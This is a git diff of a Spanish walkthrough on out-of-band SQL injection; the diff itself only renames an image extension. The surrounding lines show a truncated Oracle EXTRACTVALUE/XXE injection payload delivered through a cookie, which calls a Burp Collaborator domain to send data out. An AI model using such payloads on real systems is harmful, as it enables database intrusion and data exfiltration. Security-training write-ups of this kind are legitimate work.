@@ -80,7 +80,7 @@ SELECT EXTRACTVALUE(xmltype('<!DOCTYPE root [ <!ENTITY % remote SYSTEM
 
 Suplantar el valor de la cookie con el payload final de inyección resulta en el siguiente pedido HTTP:
 
-![Repeater](/test-page/assets/oob_ex_3.jpg)
+![Repeater](/test-page/assets/oob_ex_3.jpeg)
 
 Notar que se utiliza un dominio de *Burp Collaborator* (`oastify.com`), y que los caracteres `%` y `;` fueron reemplazados por `%25` y `%3b` respectivamente. Estas son sus codificaciones para URL y son necesarias para no generar conflicto con la interpretación/*parsing* de la cookie. Observando la respuesta en el historial de la pestaña `Collaborator`:
 
